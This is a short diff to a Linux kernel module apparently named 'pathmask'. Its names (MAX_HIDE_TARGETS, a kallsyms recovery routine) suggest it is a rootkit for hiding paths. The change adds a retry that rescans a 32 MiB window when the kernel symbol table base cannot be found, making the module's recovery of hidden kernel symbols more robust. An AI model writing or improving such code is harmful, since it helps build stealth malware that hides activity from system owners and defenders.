@@ -27,6 +27,7 @@
 #include <asm/unistd.h>
 
 #include "core.h"
+#include "hint.h"
 
 #define PM_LOG_PREFIX "pathmask: "
 #define MAX_HIDE_TARGETS 64
@@ -282,7 +283,16 @@ static unsigned long __nocfi pm_resolve(const char *name)
 
 static int pm_symrecon_init(void)
 {
+	struct kallrecon_hint hint = {
+		.scan_back = 0x2000000,
+	};
+
 	find_kallsyms_base();
+	if (kallrecon_fail_reason() == KALLRECON_NO_OFFSETS) {
+		pr_info(PM_LOG_PREFIX "offsets not found; retrying with 32 MiB scan window\n");
+		kallrecon_supply(&hint);
+		find_kallsyms_base();
+	}
 	if (!klnum_val || !kallrecon_klp) {
 		pr_err(PM_LOG_PREFIX "kallsyms recovery failed\n");
 		return -ENODATA;
